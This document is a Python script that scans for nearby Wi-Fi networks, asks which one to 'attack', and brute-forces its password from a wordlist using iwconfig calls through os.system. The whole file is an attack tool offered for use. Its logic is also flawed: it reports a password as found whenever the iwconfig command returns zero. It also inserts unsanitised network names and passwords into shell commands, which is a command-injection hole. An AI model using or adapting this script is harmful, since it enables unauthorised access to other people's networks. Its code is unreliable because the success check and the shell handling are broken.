import os
import subprocess

def scan_networks():
    # Use the 'iwlist' command to scan for available networks
    scan_output = subprocess.check_output(['iwlist', 'wlan0', 'scan']).decode('utf-8')

    # Extract the network names from the scan output
    networks = []
    lines = scan_output.split('\n')
    for line in lines:
        if 'ESSID' in line:
            network = line.split(':')[1].strip().replace('"', '')
            networks.append(network)

    return networks

def brute_force_password(network, password_file):
    # Read the password file
    with open(password_file, 'r') as file:
        passwords = file.readlines()

    # Attempt to connect to the network using each password
    for password in passwords:
        password = password.strip()
        command = f'iwconfig wlan0 essid "{network}" key "{password}"'
        result = os.system(command)

        if result == 0:
            print(f'Success! Password found: {password}')
            return

    print('Password not found.')

# Scan for available networks
networks = scan_networks()
print('Available networks:')
for network in networks:
    print(network)

# Choose a network to attack
network_to_attack = input('Enter the name of the network to attack: ')

# Specify the password file
password_file = input('Enter the path to the password file: ')

# Perform the brute-force attack
brute_force_password(network_to_attack, password_file)
